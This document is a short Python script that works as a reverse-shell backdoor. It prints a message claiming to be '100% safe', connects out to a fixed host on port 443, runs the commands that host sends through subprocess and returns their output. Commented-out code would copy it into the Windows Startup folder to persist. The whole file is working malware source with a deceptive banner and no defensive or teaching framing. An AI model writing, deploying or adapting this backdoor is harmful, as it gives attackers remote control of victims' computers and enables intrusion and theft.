import socket
import sys
import time
import os
import subprocess
import getpass
time.sleep(0)

print("Hello This is A 100% safe")
user = getpass.getuser()

#def add_to_startup(file_path=""):
#    if file_path == '':
#        file_path = os.path.abspath(os.path.realpath(__file__))
#    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user
#    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
#        bat_file.write(r'start "" %s' % file_path)

def connect():
    global s
    global port
    global host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 443
    host = "192.168.1.137"
    while True:
        try:
            s.connect(("192.168.1.137", port))
            break
        except ConnectionRefusedError:
            print("Trying again:")



def Command():
    global com
    while True:
        try:
            com = s.recv(1024)
            str(com)
            com = com.decode()
            if com == "cmd":
                print(-3)
                cmd()
                break
            if com == viewcwd():
                viewcwd()

            else:
                print("command not recognised")
        except ConnectionResetError:
            connect()

def viewcwd():
    files = os.getcwd()
    files = str(files)
    s.send(files.encode())
    print("command executed")


def cmd():
    print("a")
    while True:
        data = s.recv(1024)
        if data[ :2].decode("utf-8") == 'cd':
            os.chdir(data[3: ].decode("utf-8"))
            print(1)
        if len(data) > 0:
            print(2)
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            print(3)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            print(4)
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))

def main():
    #add_to_startup(file_path="")
    connect()
    Command()
main()












